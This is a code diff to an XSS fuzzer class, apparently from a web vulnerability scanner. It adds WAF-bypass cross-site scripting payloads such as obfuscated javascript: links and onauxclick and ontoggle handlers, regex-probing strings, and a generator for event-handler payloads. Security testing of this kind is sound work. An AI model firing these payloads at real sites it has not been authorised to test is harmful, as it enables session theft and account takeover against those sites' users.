@@ -293,6 +293,22 @@ _payloads = [
     """<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"""
 ]
 
+# reg test payloads
+_reg_payloads = [
+    # no reg
+    "<svg",
+    # <[a-z]+
+    "<dev",
+    # ^<[a-z]+
+    "x<dev",
+    # <[a-zA-Z]+
+    "<dEv",
+    # <[a-zA-Z0-9]+
+    "<d3V",
+    # <.+
+    "<d|3v ",
+]
+
 # payload for waf test
 _waf_payloads = [
     "<IMG SRC=JaVaScRiPt:alert('xss')>",
@@ -323,7 +339,15 @@ _waf_payloads = [
     '<svg/onload=co\u006efir\u006d`1`>',
     '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>',
     '<scriscriptpt>alert(/xss/)</scriscriptpt>',
-    '¼script¾alert(¢XSS¢)¼/script¾'
+    '¼script¾alert(¢XSS¢)¼/script¾',
+    '<a"/onclick=(confirm)()>click',
+    '<a/href=javascript&colon;alert()>click',
+    '<a/href=&#74;ava%0a%0d%09script&colon;alert()>click',
+    '<d3v/onauxclick=[2].some(confirm)>click',
+    '<d3v/onauxclick=(((confirm)))">click',
+    '<d3v/onmouseleave=[2].some(confirm)>click',
+    '<details/open/ontoggle=alert()>',
+    '<details/open/ontoggle=(confirm)()//'
 ]
 
 # payload with html 5 features
@@ -351,6 +375,7 @@ class XSS(Fuzzer):
     htmlTemplate = _htmlTemplate
     probes = _probes
     payloads = _payloads
+    reg_payloads = _reg_payloads
     waf_payloads = _waf_payloads
     h5payloads = _h5payloads
 
@@ -380,23 +405,47 @@ class XSS(Fuzzer):
         # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
         return url + '/.well-known/acme-challenge/?<h1>hi'
 
-    def img(self, payload):
+    @classmethod
+    def img(cls, payload):
         return '<img/onerror="%s"/src=x>' % payload
 
-    def svg(self, payload):
+    @classmethod
+    def svg(cls, payload):
         return '<svg/onload="%s"/>' % payload
 
-    def style(self, payload):
+    @classmethod
+    def style(cls, payload):
         return '<style/onload="%s"></style>' % payload
 
-    def input(self, payload):
+    @classmethod
+    def input(cls, payload):
         return '<input/onfocus="%s"/autofocus>' % payload
 
-    def marquee(self, payload):
+    @classmethod
+    def marquee(cls, payload):
         return '<marquee/onstart="%s"></marquee>' % payload
 
-    def div(self, payload):
+    @classmethod
+    def div(cls, payload):
         return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload
+
+    @classmethod
+    def template(cls, tag="img", delimiter=" ", event_handler="onerror", javascript="alert(/xss/)", ending=">"):
+        '''
+        delimiter " "
+        delimiter "\x09"
+        delimiter "\x09\x09"
+        delimiter "/"
+        delimiter "\x0a"
+        delimiter "\x0d"
+        delimiter "/~/"
+        ending ">"
+        ending "//"
+        ending " "
+        ending "\t"
+        ending "\n"
+        '''
+        return f"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}"
 
     def script(self):
         payload = "<script src='%s'></script>" % self.url
